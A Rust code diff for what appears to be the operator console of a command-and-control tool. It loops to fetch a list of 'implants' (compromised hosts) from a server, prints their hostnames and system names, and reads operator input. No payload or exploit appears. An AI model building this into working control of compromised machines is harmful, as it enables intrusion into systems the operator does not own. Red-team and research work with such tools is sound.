@@ -1,4 +1,8 @@
-use std::{env, io::Write, net::TcpStream};
+use std::{
+    env,
+    io::{Write, stdin, stdout},
+    net::TcpStream,
+};
 
 use common::{Packet, encode, read_packet};
 
@@ -28,21 +32,44 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    let mut connection = connect();
+    loop {
+        let mut connection = connect();
 
-    connection.write(
-        encode(common::Packet::ImplantListRequest)
-            .unwrap()
-            .as_slice(),
-    )?;
+        connection.write(
+            encode(common::Packet::ImplantListRequest)
+                .unwrap()
+                .as_slice(),
+        )?;
 
-    let packet = read_packet(&mut connection).unwrap();
+        let packet = read_packet(&mut connection).unwrap();
+        let mut implants = Vec::new();
 
-    match packet {
-        Packet::ImplantList(implants) => {
-            println!("{:?}", implants);
+        match packet {
+            Packet::ImplantList(implant_list) => {
+                implants = implant_list;
+            }
+            _ => {}
         }
-        _ => {}
+
+        println!("Available implants: ");
+        for (i, implant) in implants.iter().enumerate() {
+            println!(
+                "[{}]: {} ({})",
+                i + 1,
+                implant.system_info.hostname,
+                implant.system_info.name
+            );
+        }
+
+        println!("");
+        print!("> ");
+        stdout().flush().unwrap();
+        let mut input = String::new();
+        stdin().read_line(&mut input).unwrap();
+
+        if input == "exit" {
+            break;
+        }
     }
 
     Ok(())
